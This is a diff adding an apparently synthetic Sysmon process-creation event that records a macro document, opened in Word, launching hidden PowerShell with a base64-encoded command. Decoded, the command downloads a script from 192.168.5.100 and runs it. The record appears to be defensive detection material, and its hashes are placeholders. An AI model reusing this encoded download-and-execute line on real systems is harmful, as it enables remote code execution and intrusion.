@@ -1,0 +1,43 @@
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-07-08T14:41:09.8821903Z"/>
+    <EventRecordID>123489</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="4568" ThreadID="4572"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WORKSTATION01.corp.local</Computer>
+    <Security UserID="S-1-5-21-1004336348-1177238915-682003330-1234"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell;technique_id=T1027,technique_name=Obfuscated Files or Information</Data>
+    <Data Name="UtcTime">2026-07-08 14:41:09.882</Data>
+    <Data Name="ProcessGuid">{4f3a1b2c-9da5-6001-2b00-00000000004a}</Data>
+    <Data Name="ProcessId">11580</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
+    <Data Name="Description">Windows PowerShell</Data>
+    <Data Name="Product">Microsoft® Windows® Operating System</Data>
+    <Data Name="Company">Microsoft Corporation</Data>
+    <Data Name="OriginalFileName">PowerShell.EXE</Data>
+    <Data Name="CommandLine">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADUALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA</Data>
+    <Data Name="CurrentDirectory">C:\Users\jdoe\AppData\Local\Temp\</Data>
+    <Data Name="User">CORP\jdoe</Data>
+    <Data Name="LogonGuid">{4f3a1b2c-9d7f-6001-0a4e-1c0000000000}</Data>
+    <Data Name="LogonId">0x1c4e0a</Data>
+    <Data Name="TerminalSessionId">1</Data>
+    <Data Name="IntegrityLevel">Medium</Data>
+    <Data Name="Hashes">SHA1=C8F3D5B2E6A7F9C0B1D4E3F2A5B6C7D8E9F0A112,MD5=C3D4E5F60718293A4B5C6D7E8F9A0B1,SHA256=5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6</Data>
+    <Data Name="ParentProcessGuid">{4f3a1b2c-9da2-6001-2800-000000000049}</Data>
+    <Data Name="ParentProcessId">8912</Data>
+    <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+    <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\jdoe\Downloads\Invoice_2026-07.docm"</Data>
+    <Data Name="ParentUser">CORP\jdoe</Data>
+  </EventData>
+</Event>
